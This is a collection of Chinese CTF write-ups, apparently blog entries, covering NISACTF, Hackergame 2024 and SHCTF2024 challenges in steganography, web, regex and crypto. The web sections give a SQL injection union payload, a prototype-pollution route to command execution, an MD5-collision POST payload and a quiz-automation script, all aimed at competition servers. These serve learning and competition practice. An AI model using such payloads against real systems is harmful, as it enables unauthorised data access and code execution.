<h3 id="NSSCTF-NISACTF-2022-流量包里有个熊">NSSCTF [NISACTF 2022] 流量包里有个熊</h3>
<p>下载下来一个未知文件，根据题目描述猜测是 pcap 流量包。</p>
<p>跟踪 TCP 流发现一个图片文件，导出。</p>
<p>同时可以注意到这个图片文件后面是跟着一个 rar 压缩包的，分离压缩包后在里面发现被加密过的 flag 文本文件，内容一眼凯撒密码加密后的 16 进制字节。</p>
<p>偏移是 13 .</p>
<p><img src="../resources/images/2024-12_assert/13.webp" alt=""></p>
<p>解密出的字节流其实是一个 jpg 文件。</p>
<p><img src="../resources/images/2024-12_assert/real.jpg" alt=""></p>
<p>导到 stegsolve 里看，发现图片细节失真比较严重，但是没有发现其他隐写痕迹。</p>
<p>常规隐写方式都撞一遍，最后发现是盲水印。</p>
<p><img src="../resources/images/2024-12_assert/watermark.jpg" alt="评价是看吐了"></p>
<p>得到 flag ： NSSCTF{S0_clev2l_You}</p>
<h3 id="攻防世界-GFSJ0249-misc-pic-again">攻防世界 GFSJ0249 misc_pic_again</h3>
<p>下载下来一张图片，LSB隐写。</p>
<p>提取出来一个压缩包，解压后是一个二进制文件。</p>
<p>IDA Pro 打开查找字符串，发现 flag :</p>
<p><code>hctf&#123;scxdc3tok3yb0ard4g41n~~~&#125;</code></p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>Practice</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackergame 2024 WriteUp</title>
    <url>/2024/11/19/Hackergame%202024%20WriteUp/</url>
    <content><![CDATA[<h1>Web</h1>
<h2 id="·-签到">· 签到</h2>
<p><img src="/resources/images/Hackergame2024WriteUpassert/1731082888708-c1a6fb64-05e4-485a-8307-773b52f04b67.webp" alt="image.png"></p>
<p>直接启动，观察到：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731082930613-a314064d-b300-4153-8278-06d155ee94ef.webp" alt="image.png"></p>
<p>将pass参数改为true即可：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731082978825-f0851593-b4bc-44d2-b85c-69e636dd0dae.webp" alt="image.png"></p>
<p>​</p>
<h2 id="·-喜欢做签到的-CTFer-你们好呀">· 喜欢做签到的 CTFer 你们好呀</h2>
<p>根据题目描述，我们打开这个战队招新的主页：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731118862344-0adab8de-0568-4086-b5e7-de2547deb7b4.webp" alt="image.png"></p>
<p>在help指令中可以发现env指令，查看环境变量：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731118996469-6b030fe2-e285-4796-80da-c147ea60d9b8.webp" alt="image.png"></p>
<p>得到flag1.<br>
常规思路，继续输入ls：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731119065682-9cafac21-5bd3-4f0f-bbd9-7bacccfa7807.webp" alt="image.png"></p>
<p><img src="/resources/images/Hackergame2024WriteUpassert/1731119092273-6779d557-505c-49ee-91cb-dd1116cfce01.webp" alt="image.png"></p>
<p>发现flag文件，cat出来即可得到flag2：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731119147123-03db463a-dd71-4ec1-980c-8d4d3d35a971.webp" alt="image.png"></p>
<h2 id="·-比大小王">· 比大小王</h2>
<p>F12审计源码，发现：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731119299915-e1ef803f-59c8-4a87-a5a1-15277484e532.webp" alt="image.png"></p>
<p>是从服务器上提前获取题目的继续审计，发现：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731119631255-961bda5c-e974-4426-ad3a-c662811de1dc.webp" alt="image.png"></p>
<p>本地会提交答案，可能服务器端会进行验证回溯{inputs}可以发现提交的答案就是 <code>&quot;&gt;&quot;</code><br>
<code>&quot;&lt;&quot;</code></p>
<p>yakit看一下response：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731119483052-f91897da-9f4d-438f-8cbe-367a2ad62769.webp" alt="image.png"></p>
<p>加载了题目，顺带附赠一个加了时间验证的cookie（与原cookie不同）写脚本：<br>
Python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_post_request</span>(<span class="params">url, cookie_value, post_data</span>):</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&#x27;session&#x27;</span>: cookie_value</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=post_data, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    response_body = response.text</span><br><span class="line">    cookie = response.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> (cookies)</span><br><span class="line">    <span class="keyword">return</span> response_body,cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    target_url = <span class="string">&quot;http://202.38.93.141:12122/game&quot;</span></span><br><span class="line">    target_url2 = <span class="string">&quot;http://202.38.93.141:12122/submit&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cookie_value = <span class="built_in">input</span>(<span class="string">&quot;Cookie: &quot;</span>).replace( <span class="string">&#x27;session=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    post_data = <span class="built_in">input</span>(<span class="string">&quot;POST data: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    response_body ,resp_cookie = send_post_request(target_url, cookie_value, post_data)</span><br><span class="line">    </span><br><span class="line">    resp_cookie = resp_cookie.replace( <span class="string">&#x27;;HttpOnly; Path=/&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace( <span class="string">&#x27;session=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;response_body：\n<span class="subst">&#123;response_body&#125;</span>&quot;</span>)</span><br><span class="line">    data = response_body</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    parsed_data = json.loads(data)</span><br><span class="line">    values = parsed_data[<span class="string">&#x27;values&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> pair <span class="keyword">in</span> values:</span><br><span class="line">        a, b = pair</span><br><span class="line">        <span class="keyword">if</span> a &gt; b:</span><br><span class="line">            results.append(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            results.append(<span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    output_data = json.dumps(&#123;<span class="string">&#x27;inputs&#x27;</span>:results&#125;)</span><br><span class="line"></span><br><span class="line">    headers2 = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">9</span>)</span><br><span class="line">    </span><br><span class="line">    response2 ,resp_cookie2 = send_post_request(target_url2, resp_cookie, output_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(response2)</span><br></pre></td></tr></table></figure>
<p>运行，得到flag：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731121038446-452f7988-fbee-4dbc-a9ba-0a0852f8f9af.webp" alt="image.png"></p>
<h2 id="·-Node-js-is-Web-Scale">· Node.js is Web Scale</h2>
<p>审计源码，发现：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731121126080-59ad4dee-3a0f-4457-9cef-dbb2142201f1.webp" alt="image.png"></p>
<p>这一段可以执行cmds中的命令<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731121162049-36078019-9230-4b97-8e5d-f3e01dd91683.webp" alt="image.png"></p>
<p>而我们可以上传数据到store<br>
思路是原型链污染，从而RCE<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731121748551-c3b5baeb-12d4-4d7f-b9d5-50fe47153b6d.webp" alt="image.png"></p>
<p>成功污染<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731121797380-b5163fe5-def7-4d5d-9849-085c26bf0d6b.webp" alt="image.png"></p>
<p>直接cat /flag，得到flag：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731121846918-67e6858f-d07a-4bf5-a412-fadd231e84cc.webp" alt="image.png"></p>
<h2 id="·PaoluGPT">·PaoluGPT</h2>
<p><img src="/resources/images/Hackergame2024WriteUpassert/1731121929283-c2ef456d-a279-4172-af03-91daa1d8a2e4.webp" alt="image.png"></p>
<p>有很多聊天记录，F12获取所有链接，yakit爆破：发现有个Response长得眉清目秀：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731122604943-3bcad315-8589-45cd-863c-6be8a19ae001.webp" alt="image.png"></p>
<p>打开，往下拉，获得flag1：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731122671075-8ad991da-6af7-49d4-b3b6-207684e5b93c.webp" alt="image.png"></p>
<p>打开源码，审计：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731122793153-ef2a19fd-29c3-4333-9049-a9c3365afa0a.webp" alt="image.png"></p>
<p>发现SQL查询语句，应该是SQL注入注意到<code>select id, title from messages where shown = true</code>一句，将true换成false，联合查询一下：<br>
payload：<code>/view?conversation_id=-1' union select id, title from messages where shown = false --</code></p>
<p><img src="/resources/images/Hackergame2024WriteUpassert/1731123118513-395c9b4e-b80a-4fdb-b316-d4600709f8db.webp" alt="image.png"></p>
<p>得到一个id<br>
查询，下拉，得到flag2：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731123173984-d7d265a6-ad1d-4873-a76b-9d0ad9f90e90.webp" alt="image.png"></p>
<h1>General</h1>
<h2 id="·-猫咪问答（十周年纪念版）">· 猫咪问答（十周年纪念版）</h2>
<ol>
<li class="lvl-3">
<p><a href="https://lug.ustc.edu.cn/wiki/lug/events/hackergame/">信息安全大赛 Hackergame - LUG @ USTC</a> -&gt; <a href="https://lug.ustc.edu.cn/wiki/sec/contest.html">contest [SEC@USTC]</a> 答案：3A204</p>
</li>
<li class="lvl-3">
<p>寻找历年wp，得知是Hackergame 2019，根据对应第六届新闻稿得知 答案：2682</p>
</li>
<li class="lvl-3">
<p><a href="https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md">hackergame2018-writeups/official/ustcquiz/README.md at master · ustclug/hackergame2018-writeups · GitHub</a> 答案：程序员的自我修养</p>
</li>
<li class="lvl-3">
<p>Yakit爆破得到 答案：336</p>
</li>
<li class="lvl-3">
<p>紧跟时事，commit id : 6e90b6</p>
</li>
<li class="lvl-3">
<p>Yakit爆破得到 答案：1833<img src="/resources/images/Hackergame2024WriteUpassert/1731124240418-7fc32532-2c8d-4c51-b870-500a8ea58567.webp" alt="屏幕截图 2024-11-02 170746.png"></p>
</li>
</ol>
<h2 id="·-打不开的盒">· 打不开的盒</h2>
<p>在线3d查看工具，缩放看到：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731124634598-75b8d278-e7a9-402b-a409-a464ee976fd7.webp" alt="image.png"></p>
<p>得到flag.</p>
<h2 id="·-每日论文太多了！">· 每日论文太多了！</h2>
<p>搜索flag，发现高亮在图片底下<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731124749616-cb68762e-3273-42d4-b15d-2b2e171616d3.webp" alt="image.png"></p>
<p>挪开图片，得到flag：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731124838274-06e0aa29-968f-47fd-a023-2c0205773d44.webp" alt="image.png"></p>
<h2 id="·-旅行照片-4-0">· 旅行照片 4.0</h2>
<p>1）…LEO 酱？……什么时候高德搜一下图片中出现的’科里科气科创驿站’<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731125621446-9e73d1e3-0808-455b-a5a8-375fa4d61593.webp" alt="16845ba303d38ec8df7a1806b6f1632.jpg"></p>
<p>bing找晚会最早出现日期<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731125764949-d527306f-051a-4681-907f-b3b962f7195d.webp" alt="image.png"></p>
<p>答案：</p>
<ol>
<li class="lvl-3">
<p>东校区西门</p>
</li>
<li class="lvl-3">
<p>20240519<br>
2）诶？我带 LEO 酱出去玩？真的假的？在第一张图的垃圾桶上找到：<img src="/resources/images/Hackergame2024WriteUpassert/1731126026446-49eb4cb4-72c0-47f5-9e9f-d0550bef4a8f.webp" alt="image.png"><br>
六安园林百度查找<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731126086977-db4035ce-f85d-4102-b237-7f545b7f1d1f.webp" alt="image.png"></p>
</li>
</ol>
<p>完全符合。第二张是景区，百度识图答案：</p>
<ol>
<li class="lvl-3">
<p>中央公园</p>
</li>
<li class="lvl-3">
<p>坛子岭<br>
3）尤其是你才是最该多练习的人百度识图图片中央，得到地点为北京北动车运用所高德搜最近医院搜索四编组动车 北京，得到型号。答案：</p>
</li>
<li class="lvl-3">
<p>积水潭医院</p>
</li>
<li class="lvl-3">
<p>CRH6F-A</p>
</li>
</ol>
<h1>Math</h1>
<h2 id="·-强大的正则表达式">· 强大的正则表达式</h2>
<p><img src="/resources/images/Hackergame2024WriteUpassert/1731126649162-c78d8f84-832b-4dd7-92c1-bb2c5fed901b.webp" alt="image.png"></p>
<p>审计源码，可以看到有可使用的字符限制难度1要求提交可以匹配可被16整除的数的regex<br>
可被16整除的数后四位必然可被16整除，故构建表达式：<br>
<code>16个(1|2|3|4|5|6|7|8|9|0|)(所|有|能|被|1|6|整|除|的|小|于|1|w|的|数|)</code></p>
<p><img src="/resources/images/Hackergame2024WriteUpassert/1731126917674-c5ad03b1-d478-4f97-8993-4035359a3f6d.webp" alt="image.png"></p>
<p>得到flag：<br>
<img src="/resources/images/Hackergame2024WriteUpassert/1731127011937-821a8d4d-8399-43c3-aec8-4c64b864a985.webp" alt="image.png"></p>
<h2 id="·-惜字如金3-0">· 惜字如金3.0</h2>
<p>手动修复<br>
python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3                                                              </span></span><br><span class="line">                                                                                </span><br><span class="line"><span class="keyword">import</span> atexit, base64, flask, itertools, os, re                                 </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc</span>(<span class="params"><span class="built_in">input</span>: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:                                                   </span><br><span class="line">    poly, poly_degree = <span class="string">&#x27;AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA&#x27;</span>, <span class="number">48</span> </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(poly) == poly_degree + <span class="number">1</span> <span class="keyword">and</span> poly[<span class="number">0</span>] == poly[poly_degree] == <span class="string">&#x27;B&#x27;</span> </span><br><span class="line">    flip = <span class="built_in">sum</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;A&#x27;</span>].index(poly[i + <span class="number">1</span>]) &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(poly_degree))  </span><br><span class="line">    digest = (<span class="number">1</span> &lt;&lt; poly_degree) - <span class="number">1</span>                                             </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">input</span>:                                                             </span><br><span class="line">        digest = digest ^ A                                                     </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):                                                      </span><br><span class="line">            digest = (digest &gt;&gt; <span class="number">1</span>) ^ (flip <span class="keyword">if</span> digest &amp; <span class="number">1</span> == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>)           </span><br><span class="line">    <span class="keyword">return</span> digest ^ (<span class="number">1</span> &lt;&lt; poly_degree) - <span class="number">1</span>                                      </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params"><span class="built_in">input</span>: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:                                                </span><br><span class="line">    digest = crc(<span class="built_in">input</span>)                                                         </span><br><span class="line">    u2, u1, u0 = <span class="number">0xdbeEaed4cF43</span>, <span class="number">0xFDFECeBdeeD9</span>, <span class="number">0xB7E85A4E5Dcd</span>                 </span><br><span class="line">    <span class="keyword">assert</span> (u2, u1, u0) == (<span class="number">241818181881667</span>, <span class="number">279270832074457</span>, <span class="number">202208575380941</span>)  </span><br><span class="line">    digest = (digest * (digest * u2 + u1) + u0) % (<span class="number">1</span> &lt;&lt; <span class="number">48</span>)                     </span><br><span class="line">    <span class="keyword">return</span> digest.to_bytes(<span class="number">48</span> // <span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)                                   </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xzrj</span>(<span class="params"><span class="built_in">input</span>: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:                                                </span><br><span class="line">    pat, repl = <span class="string">rb&#x27;([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?&#x27;</span>, <span class="string">rb&#x27;\1&#x27;</span>                 </span><br><span class="line">    <span class="keyword">return</span> re.sub(pat, repl, <span class="built_in">input</span>, flags=re.IGNORECASE)                        </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line">paths: <span class="built_in">list</span>[<span class="built_in">bytes</span>] = []                                                         </span><br><span class="line">                                                                                </span><br><span class="line">xzrj_bytes: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>()                                                     </span><br><span class="line">                                                                                </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:                                                 </span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> f.read().splitlines():                                           </span><br><span class="line">        row = (row.rstrip() + <span class="string">b&#x27; &#x27;</span> * <span class="number">80</span>)[:<span class="number">80</span>]                                   </span><br><span class="line">        path = base64.b85encode(<span class="built_in">hash</span>(row)) + <span class="string">b&#x27;.txt&#x27;</span>                            </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> pf:                                            </span><br><span class="line">            pf.write(row)                                                       </span><br><span class="line">            paths.append(path)                                                  </span><br><span class="line">            xzrj_bytes += xzrj(row) + <span class="string">b&#x27;\r\n&#x27;</span>                                   </span><br><span class="line">                                                                                </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clean</span>():                                                                </span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> paths:                                                      </span><br><span class="line">            <span class="keyword">try</span>:                                                                </span><br><span class="line">                os.remove(path)                                                 </span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:                                           </span><br><span class="line">                <span class="keyword">pass</span>                                                            </span><br><span class="line">                                                                                </span><br><span class="line">    atexit.register(clean)                                                      </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line">bp: flask.Blueprint = flask.Blueprint(<span class="string">&#x27;answer_b&#x27;</span>, __name__)                     </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line"><span class="meta">@bp.get(<span class="params"><span class="string">&#x27;/answer_b.py&#x27;</span></span>)                                                         </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>() -&gt; flask.Response:                                                    </span><br><span class="line">    <span class="keyword">return</span> flask.Response(xzrj_bytes, content_type=<span class="string">&#x27;text/plain; charset=UTF-8&#x27;</span>) </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line"><span class="meta">@bp.post(<span class="params"><span class="string">&#x27;/answer_b.py&#x27;</span></span>)                                                        </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>() -&gt; flask.Response:                                                   </span><br><span class="line">    wrong_hints = &#123;&#125;                                                            </span><br><span class="line">    req_lines = flask.request.get_data().splitlines()                           </span><br><span class="line">    <span class="built_in">iter</span> = <span class="built_in">enumerate</span>(itertools.zip_longest(paths, req_lines), start=<span class="number">1</span>)          </span><br><span class="line">    <span class="keyword">for</span> index, (path, req_row) <span class="keyword">in</span> <span class="built_in">iter</span>:                                         </span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:                                                        </span><br><span class="line">            wrong_hints[index] = <span class="string">&#x27;Too many lines for request data&#x27;</span>              </span><br><span class="line">            <span class="keyword">break</span>                                                               </span><br><span class="line">        <span class="keyword">if</span> req_row <span class="keyword">is</span> <span class="literal">None</span>:                                                     </span><br><span class="line">            wrong_hints[index] = <span class="string">&#x27;Too few lines for request data&#x27;</span>               </span><br><span class="line">            <span class="keyword">continue</span>                                                            </span><br><span class="line">        req_row_hash = <span class="built_in">hash</span>(req_row)                                            </span><br><span class="line">        req_row_path = base64.b85encode(req_row_hash) + <span class="string">b&#x27;.txt&#x27;</span>                 </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(req_row_path):                                    </span><br><span class="line">            wrong_hints[index] = <span class="string">f&#x27;Unmatched hash (<span class="subst">&#123;req_row_hash.<span class="built_in">hex</span>()&#125;</span>)&#x27;</span>       </span><br><span class="line">            <span class="keyword">continue</span>                                                            </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(req_row_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> pf:                                    </span><br><span class="line">            row = pf.read()                                                     </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(req_row) != <span class="built_in">len</span>(row):                                        </span><br><span class="line">                wrong_hints[index] = <span class="string">f&#x27;Unmatched length (<span class="subst">&#123;<span class="built_in">len</span>(req_row)&#125;</span>)&#x27;</span>       </span><br><span class="line">                <span class="keyword">continue</span>                                                        </span><br><span class="line">            unmatched = [req_b <span class="keyword">for</span> b, req_b <span class="keyword">in</span> <span class="built_in">zip</span>(row, req_row) <span class="keyword">if</span> b != req_b] </span><br><span class="line">            <span class="keyword">if</span> unmatched:                                                       </span><br><span class="line">                wrong_hints[index] = <span class="string">f&#x27;Unmatched data (0x<span class="subst">&#123;unmatched[-<span class="number">1</span>]:02X&#125;</span>)&#x27;</span>  </span><br><span class="line">                <span class="keyword">continue</span>                                                        </span><br><span class="line">            <span class="keyword">if</span> path != req_row_path:                                            </span><br><span class="line">                wrong_hints[index] = <span class="string">f&#x27;Matched but in other lines&#x27;</span>              </span><br><span class="line">                <span class="keyword">continue</span>                                                        </span><br><span class="line">    <span class="keyword">if</span> wrong_hints:                                                             </span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;wrong_hints&#x27;</span>: wrong_hints&#125;, <span class="number">400</span>                                </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;answer_b.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> af:                                      </span><br><span class="line">        answer_flag = base64.b85decode(af.read()).decode()                      </span><br><span class="line">        closing, opening = answer_flag[-<span class="number">1</span>:], answer_flag[:<span class="number">5</span>]                    </span><br><span class="line">        <span class="keyword">assert</span> closing == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">and</span> opening == <span class="string">&#x27;flag&#123;&#x27;</span>                            </span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;answer_flag&#x27;</span>: answer_flag&#125;, <span class="number">200</span>                                </span><br></pre></td></tr></table></figure>
<p><em>做xzrj B的时候把A改成了B，懒得换回来了 XP</em></p>
<h2 id="·-零知识数独">· 零知识数独</h2>
<p>如题，可利用求解器在线求解，得到flag1</p>
<h1>AI</h1>
<h2 id="·-先不说关于我从零开始独自在异世界转生成某大厂家的-LLM-龙猫女仆这件事可不可能这么离谱，发现-Hackergame-内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」">· 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」</h2>
<p>查看附件，发现这题给了一个替换了部分字符的after.txt，需要提交的flag里应该包含before.txt的sha512前16位修复文本：<br>
No Intelligence，pure artificial</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.</span><br></pre></td></tr></table></figure>
<p>可以通过原文本的sha256验证是否更改正确总之，得到flag：<br>
<code> flag&#123;llm_lm_lm_koshitantan_fa7b655c38bc8847)</code></p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF2024 WriteUp</title>
    <url>/2024/11/20/SHCTF2024%20WriteUp/</url>
    <content><![CDATA[<h1>Web</h1>
<h2 id="·-MD5-master！">· MD5 master！</h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728397376780-b3276548-66c0-4f0a-8faf-24a12d10b1f5.webp" alt="image.png"></p>
<p>阅读代码可知，想让代码输出flag文件内容，需要满足：<br>
$master变量 拼接 POST请求发送的master1字符串≠$master变量 拼接 POST请求发送的master2字符串即master1≠master2<br>
两个拼接所得的字符串MD5相同​则利用fastcoll工具生成MD5相同文件,头为$master值<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397395956-9c5a0a82-e9f9-4f11-87c6-08bd3c79835c.webp" alt="image.png"></p>
<p>使用如下代码转换为字符串<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397406324-747285ff-c719-4921-bc3b-f05bb3f15d09.webp" alt="image.png"></p>
<p>运行结果：<br>
MD5+master%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01d%176%12%3B%0A%85%C1W%EE%AAU%8C%26%0D%C2%07%13v%9C%11%80%5E%08%12y%82W.%B6%F0%40%1D%F7%CD%CF%A9%0B%B6%CBca%99%DBSn%14%C4%BCM%7F%8F%3F%9E%A7%FF%2C%B7%C4%C7%AA%E2%D7%402%81%0D%F9%8E%F6e%97%F7%9A%B4%E2%0D%D4F%2F%13%9B%9Al%5C%927-%B5%E0%D6%3B%60H%B6%D7%7DHH%9F%86%B1%FC%F9%02B%9B%AC%03%05Y%CB%28%B7%076I%5BG%C8g%0A%C00%C9itMD5+master%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01d%176%12%3B%0A%85%C1W%EE%AAU%8C%26%0D%C2%07%13%F6%9C%11%80%5E%08%12y%82W.%B6%F0%40%1D%F7%CD%CF%A9%0B%B6%CBca%99%DB%D3n%14%C4%BCM%7F%8F%3F%9E%A7%FF%2C%B7D%C7%AA%E2%D7%402%81%0D%F9%8E%F6e%97%F7%9A%B4%E2%0D%D4F%2F%13%9B%1Al%5C%927-%B5%E0%D6%3B%60H%B6%D7%7DHH%9F%86%B1%FC%F9%02B%9B%AC%83%04Y%CB%28%B7%076I%5BG%C8g%0A%400%C9it<br>
去除MD5+master%21(对应”MD5 master!”)<br>
得到需要POST的master1,master2;<br>
构造请求包：使用Yakit：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397418829-7505f00d-81ba-4e7c-9319-5093689b5a06.webp" alt="image.png"></p>
<p>发送请求，得到Flag:<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397478676-540b88ae-713a-4ded-b731-83cd9ab38d1e.webp" alt="image.png"></p>
<h2 id="·-1zFlask">· 1zFlask</h2>
<p>题目提示打开robots.txt：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397499957-71adb540-8db0-4631-8e22-4c1f4c322ba0.webp" alt="image.png"></p>
<p>又提示打开/s3recttt目录，下载得到py文件：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397519370-5855d019-4403-4b78-a365-4019d909b989.webp" alt="image.png"></p>
<p>访问/api，发现flag文件在根目录下：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397530154-f59baf9a-2249-4c64-8c67-a124469b5a08.webp" alt="image.png"></p>
<p>构造一个url请求，cat出flag就行了：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728397545415-ee8022a1-3255-418a-ab07-18f54b7afb31.webp" alt="image.png"></p>
